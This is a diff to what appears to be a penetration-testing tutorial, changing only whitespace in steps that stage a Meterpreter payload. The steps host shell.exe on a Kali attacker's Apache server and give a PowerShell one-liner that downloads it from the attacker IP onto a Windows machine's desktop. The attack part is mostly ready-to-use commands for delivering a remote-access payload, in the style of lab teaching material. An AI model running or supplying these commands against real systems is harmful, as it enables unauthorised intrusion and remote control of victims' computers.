@@ -30,15 +30,14 @@ STEP 3: Start your Apache2 service on the Kali/Attacking machine using the follo
 OPTIONAL: Using your Web Browser, navigate to the URL of your Meterpreter payload to ensure it's ready to download
 
  http://192.168.1.3/shell.exe
-          
-	     ^replace '192.168.1.3' with the IP of your Kali machine
+             ^replace '192.168.1.3' with the IP of your Kali machine
 
 
 
 STEP 4: The following command is for a Powershell script. It will be used to download your Meterpreter payload
 
  (new-object System.Net.WebClient).DownloadFile("http://192.168.1.3/shell.exe", "c:\Users\cobalt\Desktop\shell.exe")
-							 ^KALI IP^			^Windows file path^
+                                                        ^KALI IP^			^Windows file path^
 
  -change the IP to the address of your KALI machine
 	EXAMPLE: "http://YOUR-IP/shell.exe"
